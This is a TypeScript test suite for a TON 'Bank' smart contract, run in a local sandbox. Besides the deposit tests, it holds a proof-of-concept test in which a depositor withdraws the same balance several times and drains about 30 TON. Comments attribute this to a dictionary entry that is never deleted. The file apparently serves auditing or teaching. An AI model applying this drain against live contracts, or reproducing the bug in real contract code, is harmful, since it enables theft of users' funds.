import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { Cell, toNano, fromNano } from '@ton/core';
import { Bank } from '../wrappers/Bank';
import '@ton/test-utils';
import { compile } from '@ton/blueprint';

describe('Bank', () => {
    let code: Cell;

    beforeAll(async () => {
        code = await compile('Bank');
    });

    let blockchain: Blockchain;
    let deployer: SandboxContract<TreasuryContract>;
    let bank: SandboxContract<Bank>;
    const fee = toNano(0.01);

    beforeEach(async () => {
        blockchain = await Blockchain.create();
        
        deployer = await blockchain.treasury('deployer');

        bank = blockchain.openContract(Bank.createFromConfig({address: deployer.address}, code));

        // deploy the Bank contract with an initioal balance of 100 TON
        const deployResult = await bank.sendDeploy(deployer.getSender(), toNano('100'));

        expect(deployResult.transactions).toHaveTransaction({
            from: deployer.address,
            to: bank.address,
            deploy: true,
            success: true,
        });
    });

    it("should deposit toncoin into senders bank account", async () => {
        const sendResult = await bank.sendDeposit(deployer.getSender(), toNano(100));
       
        const senderAccountBalanceAfter = await bank.getUserBalance(deployer.address);
        expect(senderAccountBalanceAfter).toBe(toNano(100) - fee);

        expect(sendResult.transactions).toHaveTransaction({
            from: deployer.address,
            to: bank.address,
            success: true
        });
    });

    it("should allow multiple deposit toncoin into senders bank account", async () => {
        await bank.sendDeposit(deployer.getSender(), toNano(100));
       
        const senderAccountBalance1 = await bank.getUserBalance(deployer.address);
        expect(senderAccountBalance1).toBe(toNano(100) - fee);

        const sendResult= await bank.sendDeposit(deployer.getSender(), toNano(50));
       
        const senderAccountBalance2 = await bank.getUserBalance(deployer.address);
        expect(senderAccountBalance2).toBe(senderAccountBalance1 + (toNano(50) - fee));

        expect(sendResult.transactions).toHaveTransaction({
            from: deployer.address,
            to: bank.address,
            success: true
        });
    });

    // text skipped since it will not pass due to the vulnerability in the contract
    xit("should deposit and then widthraw all toncoin from depositors bank account", async () => {
        // Query the blockchain for the account state
        const bankContractState = await blockchain.getContract(bank.address);
        const balanceInNano = bankContractState.balance;
        
        // user depoists 100 TON 
        const depositAmount = toNano(100);
        await bank.sendDeposit(deployer.getSender(), depositAmount);

        // user withdraws their entire balance
        const withdrawAmount = await bank.getUserBalance(deployer.address);
        await bank.sendWithdraw(deployer.getSender(), toNano(0.01), withdrawAmount);
        
        // this should set their account balance to zero but it does not because the 
        // account entry in the dictionary is not deleted (using dot . not tilde ~)
        const senderAccountBalanceAfter = await bank.getUserBalance(deployer.address);
        expect(senderAccountBalanceAfter).toBe(0n);
    });

    it("PoC depositor can withdraw their same deposit multiple times ", async () => {
        const deployerTonBalanceBefore = await deployer.getBalance();
        
        // user depoists 10 TON 
        const depositAmount = toNano(10);
        await bank.sendDeposit(deployer.getSender(), depositAmount);

        // user withdraws their entire balance 
        let withdrawAmount = await bank.getUserBalance(deployer.address);
        await bank.sendWithdraw(deployer.getSender(), toNano(0.01), withdrawAmount);

        // user can keep withdrawing as long as the contract has balance!
        await bank.sendWithdraw(deployer.getSender(), toNano(0.01), withdrawAmount);
        await bank.sendWithdraw(deployer.getSender(), toNano(0.01), withdrawAmount);
        await bank.sendWithdraw(deployer.getSender(), toNano(0.01), withdrawAmount);

        const deployerTonBalanceAfter = await deployer.getBalance();
        const deployerStolenFunds = deployerTonBalanceAfter - deployerTonBalanceBefore; 29.9409676

        // depositor now has almost 30 TON for free!
        expect(deployerStolenFunds).toBe(29940967600n);
    });
});
